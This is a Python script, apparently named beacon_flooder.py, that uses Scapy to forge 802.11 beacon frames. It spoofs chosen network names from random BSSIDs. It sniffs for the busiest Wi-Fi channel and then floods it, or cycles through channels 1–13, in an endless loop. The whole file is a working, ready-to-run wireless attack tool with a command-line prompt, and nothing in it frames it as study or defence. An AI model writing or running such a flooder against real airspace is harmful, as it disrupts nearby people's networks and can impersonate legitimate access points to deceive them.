from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, sniff
import random
import time
import subprocess

def generate_random_mac():
    """Returns a randomized locally administered MAC address."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0xFF) for _ in range(5))

def set_channel(interface: str, channel: int):
    """Set the wireless interface to a specific channel."""
    subprocess.run(
        ["iwconfig", interface, "channel", str(channel)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

def send_fake_beacons(interface: str, ssid_list, channel=None, bssid_pool=None, log_callback=None):
    """
    Sends fake beacon frames using a fixed pool of BSSIDs.
    
    Args:
        interface (str): Monitor-mode interface.
        ssid_list (list): List of SSIDs (strings) to broadcast.
        channel (int, optional): If provided, beacons are sent only on that channel.
            Otherwise, cycles through channels 1-13.
        bssid_pool (list, optional): List of BSSID strings to use. If None, a default pool of 10 is generated.
        log_callback (function, optional): Optional logging callback.
    """
    if bssid_pool is None:
        bssid_pool = [generate_random_mac() for _ in range(10)]
    
    # If a fixed channel is provided:
    if channel is not None:
        set_channel(interface, channel)
        for ssid in ssid_list:
            for bssid in bssid_pool:
                dot11 = Dot11(
                    type=0, subtype=8,
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=bssid,
                    addr3=bssid
                )
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid.strip().encode())
                rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c")
                dsset = Dot11Elt(ID="DSset", info=bytes([channel]))
                packet = RadioTap()/dot11/beacon/essid/rates/dsset

                sendp(packet, iface=interface, count=3, inter=0.05, verbose=0)
                msg = f"[i] Beacon sent on channel {channel} as '{ssid.strip()}' ({bssid})"
                print(msg)
                if log_callback:
                    log_callback(msg)
        time.sleep(0.3)
    else:
        # Fallback: cycle through channels 1-13.
        for ch in range(1, 14):
            set_channel(interface, ch)
            for ssid in ssid_list:
                for bssid in bssid_pool:
                    dot11 = Dot11(
                        type=0, subtype=8,
                        addr1="ff:ff:ff:ff:ff:ff",
                        addr2=bssid,
                        addr3=bssid
                    )
                    beacon = Dot11Beacon(cap="ESS+privacy")
                    essid = Dot11Elt(ID="SSID", info=ssid.strip().encode())
                    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c")
                    dsset = Dot11Elt(ID="DSset", info=bytes([ch]))
                    packet = RadioTap()/dot11/beacon/essid/rates/dsset

                    sendp(packet, iface=interface, count=3, inter=0.05, verbose=0)
                    msg = f"[i] Beacon sent on channel {ch} as '{ssid.strip()}' ({bssid})"
                    print(msg)
                    if log_callback:
                        log_callback(msg)
        time.sleep(0.3)

def get_most_used_channel(interface: str, duration: int = 10, log_callback=None):
    """
    Sniffs for beacon frames on the given interface during the specified duration and returns the most frequently seen channel.
    
    Args:
        interface (str): Monitor-mode interface.
        duration (int): Duration in seconds to scan.
        log_callback (function): Optional logging callback.
        
    Returns:
        tuple: (most_used_channel, channel_counts dict)
    """
    channel_counts = {}

    def process_packet(packet):
        if packet.haslayer(Dot11Beacon):
            elt = packet.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 3:  # DS Parameter Set
                    try:
                        ch = int.from_bytes(elt.info, 'little')
                        channel_counts[ch] = channel_counts.get(ch, 0) + 1
                    except Exception:
                        pass
                    break
                elt = elt.payload.getlayer(Dot11Elt)

    sniff(iface=interface, prn=process_packet, timeout=duration, store=0)
    if channel_counts:
        most_used = max(channel_counts, key=channel_counts.get)
        if log_callback:
            log_callback(f"[i] Most used channel detected: {most_used}")
        return most_used, channel_counts
    else:
        if log_callback:
            log_callback("[!] No channels detected during scan.")
        return None, channel_counts

# CLI usage: if run directly, prompt for SSIDs and channel mode.
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: sudo python3 beacon_flooder.py <interface>")
        sys.exit(1)

    iface = sys.argv[1]
    ssid_input = input("Enter SSIDs to broadcast (comma separated): ").strip()
    if not ssid_input:
        print("SSID list cannot be empty.")
        sys.exit(1)
    ssid_list = [s.strip() for s in ssid_input.split(",")]

    mode = input("Select channel mode: [1] Auto (most used) or [2] Manual: ").strip()
    if mode == "1":
        ch, _ = get_most_used_channel(iface, duration=5)
        if ch is None:
            print("No channel detected. Defaulting to channel 6.")
            ch = 6
        print(f"Using channel {ch}")
        try:
            while True:
                send_fake_beacons(iface, ssid_list, channel=ch)
        except KeyboardInterrupt:
            print("[!] Beacon flood stopped by user.")
    elif mode == "2":
        ch = int(input("Enter channel number to broadcast on: ").strip())
        try:
            while True:
                send_fake_beacons(iface, ssid_list, channel=ch)
        except KeyboardInterrupt:
            print("[!] Beacon flood stopped by user.")
    else:
        print("Invalid selection.")

